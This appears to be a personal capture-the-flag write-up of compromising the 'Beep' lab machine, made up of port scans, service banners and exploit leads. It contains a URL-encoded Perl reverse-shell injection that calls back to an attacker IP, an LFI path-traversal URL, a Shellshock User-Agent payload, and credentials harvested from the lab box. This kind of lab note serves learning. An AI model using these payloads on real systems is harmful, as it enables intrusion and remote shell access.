<link href="../../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Machine #4<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

# <span class="title">Beep


<span class="date">Friday, 6/8/2021</span> 


<br/> 

### <span class="helpmach subtitle">Could Be Relevant and Could Be Not  
   * ###  <span class="helpmach subtitle">Nmap
     * Normal Scan  
       ```console
       PORT      STATE SERVICE
       22/tcp    open  ssh
       25/tcp    open  smtp
       80/tcp    open  http
       110/tcp   open  pop3
       111/tcp   open  rpcbind
       143/tcp   open  imap
       443/tcp   open  https
       993/tcp   open  imaps
       995/tcp   open  pop3s
       3306/tcp  open  mysql
       4445/tcp  open  upnotifyp
       10000/tcp open  snet-sensor-mgmt
       ```

     * Extensive Scan

       ```console
       PORT      STATE SERVICE
       22/tcp    open  ssh
       25/tcp    open  smtp
       80/tcp    open  http
       110/tcp   open  pop3
       111/tcp   open  rpcbind
       143/tcp   open  imap
       443/tcp   open  https
       879/tcp   open  unknown
       993/tcp   open  imaps
       995/tcp   open  pop3s
       3306/tcp  open  mysql
       4190/tcp  open  sieve
       4445/tcp  open  upnotifyp
       4559/tcp  open  hylafax
       5038/tcp  open  unknown
       10000/tcp open  snet-sensor-mgmt
       ```

   * ###  <span class="helpmach subtitle">Banner Grabbing
       * Service `sieve p4190`
         ```console
         PORT     STATE SERVICE VERSION
         4190/tcp open  sieve   Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
         ```  
       * Service `mysql p3306`
         ```console
         PORT     STATE SERVICE VERSION
         3306/tcp open  mysql   MySQL (unauthorized)
         |_ssl-cert: ERROR: Script execution failed (use -d to debug)
         |_ssl-date: ERROR: Script execution failed (use -d to debug)
         |_sslv2: ERROR: Script execution failed (use -d to debug)
         |_tls-alpn: ERROR: Script execution failed (use -d to debug)
         |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
         ```

      * `IMAP p143`
         ```console
         PORT    STATE SERVICE VERSION
         143/tcp open  imap    Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
         |_imap-capabilities: Completed MULTIAPPEND ID NO RENAME ATOMIC BINARY ANNOTATEMORE LITERAL+ IMAP4 THREAD=ORDEREDSUBJECT UNSELECT LIST-SUBSCRIBED LISTEXT CONDSTORE OK MAILBOX-REFERRALS QUOTA STARTTLS CATENATE SORT=MODSEQ THREAD=REFERENCES SORT IDLE CHILDREN X-NETSCAPE RIGHTS=kxte NAMESPACE URLAUTHA0001 IMAP4rev1 ACL UIDPLUS
         Service Info: Host: example.com
         ```

      * `smtp p25`  
         ```console
         PORT   STATE SERVICE VERSION
         25/tcp open  smtp    Postfix smtpd
         |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
         Service Info: Host:  beep.localdomain
         ``` 
      * `pop3 p110`
         ```console
         PORT    STATE SERVICE VERSION
         110/tcp open  pop3    Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
         |_pop3-capabilities: APOP STLS PIPELINING RESP-CODES LOGIN-DELAY(0) AUTH-RESP-CODE IMPLEMENTATION(Cyrus POP3 server v2) EXPIRE(NEVER) USER UIDL TOP
         Service Info: Host: example.com
         ```       

      * `p5038`
         ```console
         PORT     STATE SERVICE  VERSION
         5038/tcp open  asterisk Asterisk Call Manager 1.1
         ``` 
      * `p879`
         ```console
         PORT    STATE SERVICE VERSION
         879/tcp open  status  1 (RPC #100024)
         ```    
         * This port is for the rpcbind service.  
          
      * `hylafax p4559`   
         ```console
         PORT     STATE SERVICE VERSION
         4559/tcp open  hylafax HylaFAX 4.3.10
         Service Info: Host: localhost; OS: Unix
         ```
      * `rpcbind p111`
         ```console
         PORT    STATE SERVICE VERSION
         111/tcp open  rpcbind 2 (RPC #100000)
         | rpcinfo: 
         |   program version    port/proto  service
         |   100000  2            111/tcp   rpcbind
         |   100000  2            111/udp   rpcbind
         |   100024  1            876/udp   status
         |_  100024  1            879/tcp   status
         ``` 
      * `webmin p10000`
         ```console
         PORT      STATE SERVICE VERSION
         10000/tcp open  http    MiniServ 1.570 (Webmin httpd)
         |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
         ``` 
      * `imaps p993` 
         ```
         PORT    STATE SERVICE  VERSION
         993/tcp open  ssl/imap Cyrus imapd
         |_imap-capabilities: CAPABILITY
         ```

   * ###  <span class="helpmach subtitle">Searchsploiting Shit      
     * to view the script of the exploit write the following `searchsploit -x [PATH TO SCRIPT]`.
     * Searchsploiting `webmin 1.570`

<br/><br/> 

### <span class="helpmach subtitle">Terminologies  
* What is a ShellShock?  
     In layman’s terms, Shellshock is a vulnerability that allows systems containing a vulnerable version of Bash to be exploited to execute commands with higher privileges. 

<br/><br/> 

### <span class="helpmach subtitle">Useful Info
   * I will start with the http service.
   * `Cookie: elastixSession=58cepcv54igih0lmia2r61mih6` this cookie gets sent with each request to the http and https.
   * The same cookie is being sent with the request however it was.
   
   * Apache version `Apache/2.2.3 (CentOS) Server at 10.10.10.7 Port 443`. The Apache exploits seem a bit complicated, plus I'm not sure if they'll work.  

   * some thing I got when I nced the pop port 
       ```
       nc -nv 10.10.10.7 110 
       (UNKNOWN) [10.10.10.7] 110 (pop3) open
       +OK example.com Cyrus POP3 v2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 server ready <818982514.1628267758@example.com>
       ```

   
  
   * Another email I found: 4029080524.1628350666@example.com
   * support@beep.localdomain


* <span class="helpmach subtitle">Task 1</span>  
   Search the admin account for anything useful
* <span class="helpmach subtitle">Result</span> 
  1. Found this list of services and their versions
       ```
       Kernel
          Linux(i386)-2.6.18-238.12.1.el5

        Elastix
          elastix-2.2.0-14
          elastix-firstboot-2.2.0-5
          elastix-system-2.2.0-14
          elastix-email_admin-2.2.0-9
          elastix-vtigercrm-5.1.0-8
          elastix-extras-2.0.4-4
          elastix-asterisk-sounds-1.2.3-1
          elastix-my_extension-2.2.0-5
          elastix-agenda-2.2.0-5
          elastix-a2billing-1.8.1-16
          elastix-addons-2.2.0-4
          elastix-im-2.0.4-2
          elastix-pbx-2.2.0-14
          elastix-pr-2.0-2
          elastix-security-2.2.0-7
          elastix-reports-2.2.0-6
          elastix-fax-2.2.0-4

        RounCubeMail
          RoundCubeMail-0.3.1-10

        Mail
          postfix-2.3.3-2.3.el5_6
          cyrus-imapd-2.3.7-7.el5_6.4

        IM
          openfire-3.5.1-2

        FreePBX
          freePBX-2.8.1-7

        Asterisk
          asterisk-1.8.7.0-0
          asterisk-perl-0.10-2
          asterisk-addons-1.8.7.0-0

        FAX
          hylafax-4.3.10-2rhel5
          iaxmodem-1.2.0-1.1

        DRIVERS
          dahdi-2.4.1.2-5
          rhino-0.99.4-2.rc1
          wanpipe-util-3.5.23-1
       ```
  2. A user name "Fanis Papafanopoulos".
  3. Fanis's secret "fji#REH9i##nrIIOnjndwP923UEj"
  4. Admin's password: jEhdIekWmdjE. 
  5. Found this page : https://10.10.10.7/admin/config.php
  6. Username:standardUser, password:  f5YkfbzOUnJwGED
  7. vtiger's liscense 
     ```
     This software is a collective work consisting of the following major Open Source components:
     Apache software, MySQL server, PHP, SugarCRM, ADOdb, Smarty, PHPMailer, phpSysinfo, MagpieRSS and others, each licensed under a separate Open Source License. vtiger.com is not affiliated with nor endorsed by any of the above providers. See Copyrights for details.);
     ```

<br/>

* <span class="helpmach subtitle">Task 2</span>  
   Looking for exploits on a2billing (because I forgot what I found earlier).
* <span class="helpmach subtitle">Result</span>  
   No exploits on the version we have.  

<br/>

* <span class="helpmach subtitle">Task 3</span>  
    Exploits found on vtiger.
* <span class="helpmach subtitle">Result</span>
1. On the version we have there's LFI that I already used to get the admin's password which was through the php file `graph.php`.  
2. Found some file that has a vulnerability called `phprint.php` it gives me the error message `Error:wrong print link` or something similar. But I honestly didn't understand the entire code of the exploit.
 
<br/>

* <span class="helpmach subtitle">Task 4</span>    
    Trying to find some vulnerability in the webmin webpage.
* <span class="helpmach subtitle">Result</span>  
Nothing so far. 
I found something to do with the password_change.cgi but password changing is disabled plus the exploit is newer than the version on the box.
A webpage says all versions before 1.920 are vulnerable to a remote code excution vulnerability (the password_change one). But it says the option of resetting the password should be on and it's not so I have to forget about it.

<br/>

* <span class="helpmach subtitle">Task 5</span>    
    Find out what this php code means 
    ```
  https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.8%3a1234%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
  ```
* <span class="helpmach subtitle">Result</span>  
    Yet to be accomplished. 

<br/>

* <span class="helpmach subtitle">Task 6</span>  
   Gobuster the http service.
* <span class="helpmach subtitle">Result</span>   
   Didn't find anything useful.  

<br/>

* <span class="helpmach subtitle">Task 7</span>  
   Trying to exploit the IMAP or the POP3 services.
* <span class="helpmach subtitle">Result</span>   
   Didn't find any exploit on the version we have (2.3.7).  

<br/>

* <span class="helpmach subtitle">Task 8</span>  
   Research exploits for the php version or the phpinfo file we found on the website.
* <span class="helpmach subtitle">Result</span>   
   So far they seem like they're a bit hard to understand to be honest. Too much use of libraries and so little explanation.
<br/><br/>

### <span class="helpmach subtitle">Why I Got Stuck?  
<br/><br/>

### <span class="helpmach subtitle">Nice Things I Found in Someone Else's Write Up  

* <span class="helpmach">The LFI Exploit</span>  
  1. In the file we were able to get to through this path `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`, instead of just reading it as is I could've opened the source code where it was written in a much more readable way.

  2. I could've logged in as `root` with the admin's password through ssh and BOOM I'll get access to the machine with root privilage also.

* <span class="helpmach">Webmin Exploit</span>  
   1. I had the ability to sign into it also with the admin's credentials. When I tried that it didn't work not sure why, I think I probably pasted the password in a wrong way or sth.
   2. The writeup's author words `Logged in here, I basically own the system. I can change passwords for any user (see image above), schedule crons, install packages, or run commands as any user.`
   3. So how does it give me access to the box?  
   <img src="webmin_shell.PNG">  

* <span class="helpmach">ShellShock</span>  
   1. I've been experimenting with shellshock the wrong way, they used he User-Agent header.
   2. Wherever there's CGI there's shellshock, that's what the writeup states.
   3. It's so simple you just put the following in the User-Agent header `() { :; };[cmd]`, so to try it out they used the command `sleep 10` so a delay would be evident.

* <span class="helpmach">SMTP</span>  
   * What is Swaks in Kali Linux?  
    Swaks is a featureful, flexible, scriptable, transaction-oriented SMTP test tool written and maintained by John Jetmore.  
	
	
* Then to the next machine which is [[Cronos]]